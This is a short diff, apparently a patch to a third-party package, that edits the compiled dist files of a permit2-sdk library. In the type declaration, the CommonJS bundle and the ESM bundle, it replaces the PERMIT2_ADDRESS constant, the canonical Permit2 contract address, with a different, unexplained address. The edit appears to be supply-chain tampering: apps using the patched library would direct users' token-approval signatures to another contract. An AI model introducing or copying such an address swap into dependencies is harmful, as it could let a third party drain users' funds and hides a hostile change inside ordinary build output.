@@ -1,0 +1,37 @@
+diff --git a/dist/constants.d.ts b/dist/constants.d.ts
+index 57292f1914b8bc4dc6983181b6dfed49fa49b783..60a7fac813634697c202f5ffd9d13e5eff8d66f6 100644
+--- a/dist/constants.d.ts
++++ b/dist/constants.d.ts
+@@ -1,5 +1,5 @@
+ import { BigNumber } from '@ethersproject/bignumber';
+-export declare const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
++export declare const PERMIT2_ADDRESS = "0xc9C4e30Ad335e35761dF66fAc088DC26E4E7767A";
+ export declare const MaxUint48: BigNumber;
+ export declare const MaxUint160: BigNumber;
+ export declare const MaxUint256: BigNumber;
+diff --git a/dist/permit2-sdk.cjs.development.js b/dist/permit2-sdk.cjs.development.js
+index 7e86f8ead26dc085ec6d061e771262ddfacd869f..76745845b27fe1fcc62fdb06ab573fefcdca692d 100644
+--- a/dist/permit2-sdk.cjs.development.js
++++ b/dist/permit2-sdk.cjs.development.js
+@@ -9,7 +9,7 @@ var hash = require('@ethersproject/hash');
+ var bignumber = require('@ethersproject/bignumber');
+ var contracts = require('@ethersproject/contracts');
+ 
+-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
++var PERMIT2_ADDRESS = '0xc9C4e30Ad335e35761dF66fAc088DC26E4E7767A';
+ var MaxUint48 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffff');
+ var MaxUint160 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
+ var MaxUint256 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+diff --git a/dist/permit2-sdk.esm.js b/dist/permit2-sdk.esm.js
+index c8239accffd070249684aee520ece953b104ca42..9b6373bc9628d8143ffefcf0dcc4af1eb2de9ffd 100644
+--- a/dist/permit2-sdk.esm.js
++++ b/dist/permit2-sdk.esm.js
+@@ -3,7 +3,7 @@ import { _TypedDataEncoder } from '@ethersproject/hash';
+ import { BigNumber } from '@ethersproject/bignumber';
+ import { Contract } from '@ethersproject/contracts';
+ 
+-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
++var PERMIT2_ADDRESS = '0xc9C4e30Ad335e35761dF66fAc088DC26E4E7767A';
+ var MaxUint48 = /*#__PURE__*/BigNumber.from('0xffffffffffff');
+ var MaxUint160 = /*#__PURE__*/BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
+ var MaxUint256 = /*#__PURE__*/BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
